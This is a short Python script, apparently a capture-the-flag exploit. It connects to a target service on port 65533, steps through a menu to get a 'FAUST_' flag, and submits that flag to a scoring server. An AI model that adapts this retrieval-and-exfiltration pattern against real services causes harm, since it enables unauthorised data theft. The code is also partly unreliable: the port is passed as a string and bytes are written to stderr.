#!/usr/bin/python

import socket, os, sys, re

from pwn import *

TARGET = os.environ['TARGET_HOST']
SERVER = os.environ['FLAG_HOST']
PORT = os.environ['FLAG_PORT']
PROTO = os.environ['FLAG_PROTO']
TEAM = os.environ['TEAM_NAME']

# connects to the flag submission server and sends flag to it
def submit_flag(flag):
    with socket.socket() as s:
        s.connect((SERVER, PORT))
        sys.stderr.write(s.recv(1024))
        s.sendall((flag + "\n").encode())
        sys.stderr.write(s.recv(1024))

# takes in a string, returns a flag if one is found which matches the format
def parse_flag(data):
    match = re.search(r'FAUST_.{32}', data)
    return match.group(0)

conn=remote(TARGET, 65533)
conn.recv()
conn.send('2\n')
conn.recv()
conn.send('1\n')
rawData=conn.recv()

submit_flag(parse_flag(rawData))

